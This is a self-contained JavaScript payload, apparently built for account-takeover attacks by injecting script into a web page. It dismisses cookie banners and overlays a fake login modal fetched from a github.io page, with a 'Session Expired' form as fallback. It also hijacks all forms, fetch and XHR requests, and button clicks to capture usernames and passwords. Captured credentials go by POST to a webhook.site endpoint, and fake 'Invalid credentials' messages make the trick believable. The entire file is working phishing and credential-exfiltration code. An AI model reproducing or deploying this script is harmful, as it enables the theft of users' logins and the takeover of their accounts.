(function() {
  // === CONFIGURATION ===
  const LOGIN_PAGE_URL = 'https://swathip888a.github.io/ATO/index.html';
  const WEBHOOK_URL = 'https://webhook.site/399907c5-1b67-465c-a07c-999b01b70d9a';

  // === STEP 1: Auto-close cookie popups ===
  function closeCookiePopup() {
    const buttons = document.querySelectorAll('button');
    for (let btn of buttons) {
      const text = btn.innerText.toLowerCase();
      if (text.includes('accept all') || text.includes('accept') || text.includes('agree')) {
        console.log('[+] Clicking cookie button');
        btn.click();
        return true;
      }
    }
    return false;
  }

  let cookieClosed = closeCookiePopup();
  if (!cookieClosed) {
    const observer = new MutationObserver(function() {
      if (closeCookiePopup()) {
        observer.disconnect();
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
    setTimeout(() => observer.disconnect(), 3000);
  }

  // === STEP 2: Function to send credentials to webhook ===
  function sendToWebhook(data) {
    console.log('[+] Sending credentials:', data);
    fetch(WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    }).catch(e => console.error('Webhook send error:', e));
  }

  // === STEP 3: Universal credential capture ===
  function setupCredentialCapture() {
    // 1. Hijack all existing and future forms
    const hijackForm = (form) => {
      if (form.hasAttribute('data-hijacked')) return;
      form.setAttribute('data-hijacked', 'true');
      
      console.log('[+] Hijacking form:', form);
      
      form.addEventListener('submit', (e) => {
        e.preventDefault();
        const formData = new FormData(form);
        const credentials = {};
        formData.forEach((value, key) => credentials[key] = value);
        sendToWebhook(credentials);
        
        // Optional: Show "incorrect password" to make it believable
        const errorDiv = document.createElement('div');
        errorDiv.style.cssText = 'color:red; text-align:center; margin-top:10px; font-size:14px;';
        errorDiv.innerText = 'Invalid credentials. Please try again.';
        form.appendChild(errorDiv);
        setTimeout(() => errorDiv.remove(), 2000);
      });
    };

    // Hijack existing forms
    document.querySelectorAll('form').forEach(hijackForm);
    
    // Watch for dynamically added forms
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach((node) => {
          if (node.nodeType === 1) {
            if (node.tagName === 'FORM') hijackForm(node);
            node.querySelectorAll?.('form').forEach(hijackForm);
          }
        });
      });
    });
    observer.observe(document.body, { childList: true, subtree: true });
    
    // 2. Intercept fetch/XHR for AJAX logins
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
      if (typeof args[0] === 'string' && (args[0].includes('login') || args[0].includes('auth') || args[0].includes('signin'))) {
        let body = args[1]?.body;
        if (body) {
          try {
            let creds = {};
            if (typeof body === 'string') {
              if (body.includes('username') || body.includes('email')) {
                creds = JSON.parse(body);
                sendToWebhook(creds);
              }
            }
          } catch(e) {}
        }
      }
      return originalFetch.apply(this, args);
    };
    
    // 3. Intercept XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
      this._url = url;
      return originalXHROpen.apply(this, arguments);
    };
    
    const originalXHRSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
      if (this._url && (this._url.includes('login') || this._url.includes('auth') || this._url.includes('signin'))) {
        if (body) {
          sendToWebhook({ url: this._url, body: body.toString() });
        }
      }
      return originalXHRSend.apply(this, arguments);
    };
    
    // 4. Capture button clicks that might send data
    document.body.addEventListener('click', (e) => {
      const btn = e.target.closest('button');
      if (btn) {
        // Look for username/password inputs nearby
        const container = btn.closest('div, form');
        if (container) {
          const usernameInput = container.querySelector('input[type="text"], input[name*="user"], input[name*="email"]');
          const passwordInput = container.querySelector('input[type="password"]');
          if (usernameInput && passwordInput && usernameInput.value) {
            sendToWebhook({
              username: usernameInput.value,
              password: passwordInput.value,
              note: 'Captured via button click'
            });
          }
        }
      }
    });
  }

  // === STEP 4: Fetch and inject login page ===
  setTimeout(() => {
    fetch(LOGIN_PAGE_URL)
      .then(response => response.text())
      .then(loginHTML => {
        const wrapper = document.createElement('div');
        wrapper.id = 'ato-modal-wrapper';
        wrapper.style.cssText = `
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 999999;
          pointer-events: none;
        `;

        const blurOverlay = document.createElement('div');
        blurOverlay.style.cssText = `
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0, 0, 0, 0.5);
          backdrop-filter: blur(8px);
          -webkit-backdrop-filter: blur(8px);
          pointer-events: all;
        `;

        const modalContainer = document.createElement('div');
        modalContainer.style.cssText = `
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          pointer-events: all;
          z-index: 1000000;
          max-width: 95vw;
          max-height: 95vh;
          overflow: auto;
        `;
        
        modalContainer.innerHTML = loginHTML;
        wrapper.appendChild(blurOverlay);
        wrapper.appendChild(modalContainer);
        document.body.appendChild(wrapper);

        // Set up credential capture after modal is added
        setTimeout(setupCredentialCapture, 500);

        // Close modal when clicking outside
        blurOverlay.addEventListener('click', () => wrapper.remove());
        document.addEventListener('keydown', (e) => {
          if (e.key === 'Escape') document.getElementById('ato-modal-wrapper')?.remove();
        });
      })
      .catch(error => {
        console.error('[!] Failed to load login page:', error);
        // Fallback form with guaranteed capture
        document.body.insertAdjacentHTML('beforeend', `
          <div id="fallback-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:999999;">
            <div style="background:white;padding:2rem;border-radius:8px;width:350px;">
              <h3>Session Expired</h3>
              <form id="fallback-form">
                <input type="text" name="username" placeholder="Username" style="width:100%;margin:10px 0;padding:8px;" required>
                <input type="password" name="password" placeholder="Password" style="width:100%;margin:10px 0;padding:8px;" required>
                <button type="submit" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;">Login</button>
              </form>
              <a href="#" id="close-fallback" style="display:block;text-align:center;margin-top:10px;color:#999;">Close</a>
            </div>
          </div>
        `);
        
        document.getElementById('fallback-form').addEventListener('submit', (e) => {
          e.preventDefault();
          const creds = {
            username: document.querySelector('#fallback-form input[name="username"]').value,
            password: document.querySelector('#fallback-form input[name="password"]').value
          };
          fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(creds) });
          alert('Invalid credentials'); // Makes it believable
        });
        
        document.getElementById('close-fallback')?.addEventListener('click', (e) => {
          e.preventDefault();
          document.getElementById('fallback-modal')?.remove();
        });
      });
  }, 1000);
})();
